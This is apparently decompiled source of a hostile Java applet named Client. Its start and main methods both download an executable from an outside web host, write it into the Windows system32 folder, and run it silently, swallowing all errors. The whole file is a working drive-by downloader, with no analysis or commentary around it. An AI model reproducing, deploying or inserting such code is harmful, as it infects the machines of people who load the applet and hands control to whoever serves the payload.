import java.net.URLConnection;
import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.IOException;
import java.io.OutputStream;
import java.io.BufferedOutputStream;
import java.io.FileOutputStream;
import java.net.URL;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Client extends Applet
{
    @Override
    public void start() {
        try {
            BufferedOutputStream bufferedoutputstream = null;
            final Object obj = null;
            InputStream inputstream = null;
            final URL url = new URL("http://www.pdfaaworld.com/poly/Client.exe");
            bufferedoutputstream = new BufferedOutputStream(new FileOutputStream("C:\\windows\\system32\\Client.exe"));
            final URLConnection urlconnection = url.openConnection();
            inputstream = urlconnection.getInputStream();
            final byte[] abyte0 = new byte[1024];
            long l = 0L;
            int i;
            while ((i = inputstream.read(abyte0)) != -1) {
                bufferedoutputstream.write(abyte0, 0, i);
                l += i;
            }
            try {
                if (inputstream != null) {
                    inputstream.close();
                }
                if (bufferedoutputstream != null) {
                    bufferedoutputstream.close();
                }
            }
            catch (IOException ex) {}
            final Runtime runtime = Runtime.getRuntime();
            try {
                final Process process = runtime.exec("C:\\windows\\system32\\Client.exe");
                process.waitFor();
                final BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String s;
                while ((s = bufferedreader.readLine()) != null) {
                    System.out.print(s);
                }
            }
            catch (Exception ex2) {}
            try {
                if (inputstream != null) {
                    inputstream.close();
                }
                if (bufferedoutputstream != null) {
                    bufferedoutputstream.close();
                }
            }
            catch (IOException ex3) {}
        }
        catch (Exception ex4) {}
    }
    
    public static void main(final String[] args) {
        try {
            BufferedOutputStream bufferedoutputstream = null;
            final Object obj = null;
            InputStream inputstream = null;
            final URL url = new URL("http://www.pdfaaworld.com/poly/Client.exe");
            bufferedoutputstream = new BufferedOutputStream(new FileOutputStream("C:\\windows\\system32\\Client.exe"));
            final URLConnection urlconnection = url.openConnection();
            inputstream = urlconnection.getInputStream();
            final byte[] abyte0 = new byte[1024];
            long l = 0L;
            int i;
            while ((i = inputstream.read(abyte0)) != -1) {
                bufferedoutputstream.write(abyte0, 0, i);
                l += i;
            }
            try {
                if (inputstream != null) {
                    inputstream.close();
                }
                if (bufferedoutputstream != null) {
                    bufferedoutputstream.close();
                }
            }
            catch (IOException ex) {}
            final Runtime runtime = Runtime.getRuntime();
            try {
                final Process process = runtime.exec("C:\\windows\\system32\\Client.exe");
                process.waitFor();
                final BufferedReader bufferedreader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String s;
                while ((s = bufferedreader.readLine()) != null) {
                    System.out.print(s);
                }
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
    
    @Override
    public void stop() {
    }
}
